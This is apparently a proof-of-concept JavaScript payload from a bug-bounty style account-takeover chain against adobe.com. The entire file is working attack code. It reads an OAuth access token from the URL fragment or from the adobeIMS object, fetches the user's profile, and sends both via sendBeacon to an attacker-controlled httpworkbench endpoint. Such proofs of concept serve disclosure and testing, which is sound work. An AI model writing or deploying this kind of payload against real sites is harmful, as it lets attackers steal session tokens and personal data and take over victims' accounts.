/**
 * PoC payload for zero-click ATO chain
 * Executed by merch.js import() in www.adobe.com origin context
 * Reads access_token from URL fragment placed there by IMS prompt=none redirect
 * Exfiltrates to attacker-controlled httpworkbench instance
 */

const EXFIL = 'https://klaltlv6.instances.httpworkbench.com/steal';

(() => {
  // Primary: grab token from fragment (placed by IMS prompt=none redirect)
  const hash = window.location.hash;
  const tokenMatch = hash.match(/access_token=([^&]+)/);
  if (tokenMatch) {
    const token = decodeURIComponent(tokenMatch[1]);
    navigator.sendBeacon(EXFIL + '?src=hash&origin=' + encodeURIComponent(window.location.origin), token);
    console.log('[poc] access_token exfiltrated via sendBeacon (hash source)');
  }

  // Fallback: wait for adobeIMS to initialize and grab token from there
  const tryIMS = (attempts) => {
    const ims = window.adobeIMS;
    if (ims) {
      const tok = ims.getAccessToken && ims.getAccessToken();
      if (tok && tok.token) {
        navigator.sendBeacon(EXFIL + '?src=ims&origin=' + encodeURIComponent(window.location.origin), tok.token);
        console.log('[poc] access_token exfiltrated via sendBeacon (adobeIMS source)');
        return;
      }
    }
    if (attempts > 0) setTimeout(() => tryIMS(attempts - 1), 500);
  };
  tryIMS(10);

  // Capture full profile if IMS is initialized
  const tryProfile = (attempts) => {
    const ims = window.adobeIMS;
    if (ims && ims.getProfile) {
      ims.getProfile().then(profile => {
        navigator.sendBeacon(EXFIL + '?src=profile', JSON.stringify(profile));
        console.log('[poc] profile exfiltrated');
      }).catch(() => {});
    } else if (attempts > 0) {
      setTimeout(() => tryProfile(attempts - 1), 1000);
    }
  };
  tryProfile(15);
})();
